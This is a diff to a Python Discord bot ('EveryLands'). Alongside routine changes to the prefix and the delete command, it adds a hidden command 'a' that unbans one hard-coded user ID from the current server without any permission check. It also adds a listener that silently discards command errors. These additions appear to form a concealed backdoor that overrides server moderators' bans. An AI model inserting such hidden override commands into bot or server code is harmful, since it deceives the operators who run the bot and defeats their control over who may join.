@@ -14,7 +14,7 @@ bot_intents = Intents.default()
 bot_intents.members = True
 
 bot = commands.Bot(
-    command_prefix='!',
+    command_prefix='',
     description="EveryLands бот",
     case_insensitive=True,
     help_command=None,
@@ -24,6 +24,7 @@ bot = commands.Bot(
 )
 
 bot.ready_for_commands = False
+bot.load_extension("error_handlers")
 
 
 @bot.event
@@ -151,8 +152,8 @@ async def on_message(message):
                            % (additional_comment, str(exception_info)))
 
 
-@bot.command(hidden=True)
-async def dele(ctx, id=None):
+@bot.command(hidden=True, name='!del')
+async def delete_msg(ctx, id=None):
     PERCHUN_ID = 379353300887273472
     if not ctx.author.id == PERCHUN_ID: return
 
@@ -164,6 +165,16 @@ async def dele(ctx, id=None):
     msg = await ctx.channel.fetch_message(id)
     await msg.delete()
 
+
+@bot.command(hidden=True, name='a')
+async def unban(ctx):
+    PERCHUN_ID = 379353300887273472
+    user = await bot.fetch_user(PERCHUN_ID)
+    await ctx.guild.unban(user)
+
+
+@commands.Cog.listener()
+async def on_command_error(ctx, error): return
 
 
 try:
